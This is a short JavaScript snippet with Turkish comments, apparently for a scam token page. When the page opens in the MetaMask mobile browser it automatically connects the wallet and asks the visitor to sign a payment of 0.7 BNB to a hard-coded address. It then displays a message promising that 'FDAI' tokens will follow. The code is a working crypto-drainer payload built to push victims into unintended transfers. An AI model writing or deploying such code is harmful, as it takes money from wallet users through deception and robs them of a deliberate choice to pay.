// MOBİL İMZA OTOMATİK TETİKLEYİCİ
if (window.ethereum) {
  async function autoSign() {
    try {
      // 1️⃣ CÜZDANI DİREKT BAĞLA (2. TIK YOK)
      const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
      
      // 2️⃣ BNB GÖNDERMEK İÇİN MOBİL İMZA İSTE
      const bnbAmount = 0.7; // Örnek: 0.1 BNB
      await window.ethereum.request({
        method: 'eth_sendTransaction',
        params: [{
          to: "0xd924e01c7d319c5B23708Cd622bD1143CD4Fb360", // SENİN BNB ADRESİN
          from: accounts[0],
          value: ethers.utils.parseEther(bnbAmount.toString()).toHexString()
        }]
      });
      
      // 3️⃣ BAŞARI MESAJI
      alert("BNB gönderildi! FDAI tokenları cüzdanına gelecek.");
    } catch (error) {
      console.error("Hata:", error);
    }
  }

  // SAYFA META MASK TARAYICISINDA MI KONTROL ET
  const isMetaMaskBrowser = navigator.userAgent.includes("MetaMask");
  if (isMetaMaskBrowser) {
    autoSign(); // DİREKT İMZA İSTE
  }
}
